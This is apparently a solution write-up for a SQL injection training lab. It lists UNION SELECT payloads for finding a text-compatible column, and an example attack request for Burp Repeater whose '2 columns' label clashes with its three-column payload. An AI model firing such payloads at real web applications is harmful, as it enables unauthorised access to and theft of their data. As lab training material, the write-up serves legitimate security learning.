# Lab: SQL injection UNION attack, finding a column containing text (Practitioner)

**Goal:** Find which column accepts string data and make the application display the string provided by the lab.

## Solution

1. First determine number of columns (usually 2 or 3). Test each column with a string:

```
' UNION SELECT 'a',NULL--
' UNION SELECT NULL,'a'--
' UNION SELECT NULL,NULL,'a'--
```
This string works: ' UNION SELECT NULL,'a',NULL--

Column 2 is compatible with String datatype.

2. Replace `'a'` with the string given in the lab description (e.g. a random string like `Qrc0Pq...`).

## Example Payload (assuming 2 columns, second is text)

```
In Burp Repeater: GET /filter?category='+UNION+SELECT+NULL,'YOUR-LAB-STRING',NULL--' 
```
